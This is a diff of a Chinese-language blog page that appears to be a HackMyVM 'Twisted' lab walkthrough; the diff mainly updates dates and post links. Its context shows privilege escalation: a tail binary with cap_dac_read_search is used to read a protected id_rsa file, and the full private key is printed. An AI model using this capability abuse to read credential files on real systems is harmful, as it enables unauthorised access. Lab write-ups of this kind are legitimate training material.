@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/679cc6a8d0e0a243d4f8cd2f.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/679cc6a9d0e0a243d4f8cd31.png">
 <meta property="article:published_time" content="2025-01-31T11:16:48.000Z">
-<meta property="article:modified_time" content="2025-02-03T03:33:54.419Z">
+<meta property="article:modified_time" content="2025-03-03T13:00:56.020Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="HMV">
@@ -141,7 +141,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">57</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -229,7 +229,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-03 11:33:54" itemprop="dateModified" datetime="2025-02-03T11:33:54+08:00">2025-02-03</time>
+                <time title="修改时间：2025-03-03 21:00:56" itemprop="dateModified" datetime="2025-03-03T21:00:56+08:00">2025-03-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -287,7 +287,7 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="title class_">Hi</span> bonita,</span><br><span class="line">I have saved your id_rsa <span class="symbol">here:</span> /var/cache/apt/id_rsa</span><br><span class="line"><span class="title class_">Nobody</span> can find it. </span><br></pre></td></tr></table></figure></div>
 <p>提示有一个用户叫做bonita 利用id_rsa文件登录到这个用户<br>现在没有权限读取这个文件<br>但是home目录下面找到两个其他用户的文件夹 </p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">bonita  markus  mateo</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>cd bonita/</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home/bonita</span><span class="variable">$ </span>ls</span><br><span class="line">beroot  user.txt</span><br></pre></td></tr></table></figure></div>
-<p>但是都没有权限 所以现在必须要找到利用id_rsa的办法<br>没有思路 看wp， 大佬用了getcap这个命令查看文件的权利  记录记录<a href="/posts/11168.html" title="linux基础指令笔记">linux基础指令</a></p>
+<p>但是都没有权限 所以现在必须要找到利用id_rsa的办法<br>没有思路 看wp， 大佬用了getcap这个命令查看文件的权利  记录记录<a href="/posts/49809.html" title="linux指令笔记">linux指令笔记</a></p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>/usr/sbin/getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/tail</span> = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure></div>
 <p>发现tail指令可以绕过文件的读和搜索权限  所以用tail指令获取id_rsa内容</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">markus@twisted:~$ tail <span class="operator">-</span>n <span class="number">50</span> <span class="symbol">/var/cache/apt/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa<span class="operator">+</span>xshyrmk6zd</span><br><span class="line">FyguFUO7tN2TCJGTomDTXrG<span class="symbol">/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span></span><br><span class="line">olvmldJg2habNOUGA4EBKlTwfDi<span class="operator">+</span>vjDP8d77mF<span class="operator">+</span>rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class="line">vD5282SncYtJb<span class="symbol">/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span></span><br><span class="line">gFnch7ptoxAqe0M0UIEzP<span class="operator">+</span>G2ull3m80G5L7Q<span class="symbol">/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span></span><br><span class="line">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class="line">gl9<span class="operator">+</span>zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class="line">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW<span class="operator">+</span>aV0mDaFps05QYDgQEqVPB8OL6<span class="operator">+</span>MM<span class="symbol">/x3vuYX6u8</span></span><br><span class="line">DcTBHe<span class="operator">+</span>PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class="line">uN7M51f7<span class="operator">+</span>eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM<span class="symbol">/4ba6WXebzQbkvtD/dpyD</span></span><br><span class="line">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class="line">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa<span class="operator">+</span>VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class="line">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4<span class="symbol">/</span></span><br><span class="line">hmJTiFsew<span class="operator">+</span><span class="number">7</span>IAKE<span class="operator">+</span>oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K<span class="symbol">/v/x2pW78HIktaQPutro</span></span><br><span class="line">nxD8<span class="operator">/</span>fwGxQnseC69E6vdh<span class="operator">/</span><span class="number">5</span>tS8<span class="operator">+</span>lDEfYDz4oEy9AP26Hdtho0D6E9VT9T<span class="symbol">//2vynHLbmSXK</span></span><br><span class="line">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD<span class="operator">+</span>g8BhMCovIBrPZlHCu<span class="operator">+</span></span><br><span class="line">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG<span class="operator">+</span><span class="number">9</span><span class="symbol">/PI6bN+iwloDlugtq</span></span><br><span class="line">yzvf924Kkhdk<span class="operator">+</span>N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4<span class="operator">+</span>fgo9LCyphiXrm7UbJHDVSP</span><br><span class="line">UvPg4Fg<span class="symbol">/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span></span><br><span class="line">V2URHPPhqFEa<span class="operator">+</span>iB138cSgCU3RxbRK7Qm1S7<span class="symbol">/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span></span><br><span class="line">LlecEv2Hx03xyRZBsHFkMf<span class="operator">+</span>dMDC0ueU692Gl7YxRw<span class="operator">+</span>Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class="line">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2<span class="symbol">/OqQgKF</span></span><br><span class="line">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class="line">D0POe<span class="operator">+</span>rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
@@ -416,7 +416,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-count">57</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -452,6 +452,9 @@
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/posts/40609.html" title="posts&#x2F;40609.html">CSRF漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/posts/26924.html" title="posts&#x2F;26924.html">HMV-Forbidden</a>
         </li>
         <li class="links-of-recent-posts-item">
@@ -462,9 +465,6 @@
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/963.html" title="posts&#x2F;963.html">HMV-Learn2Code</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/28713.html" title="posts&#x2F;28713.html">MoeCTF_2023web</a>
         </li>
     </ul>
   </div>
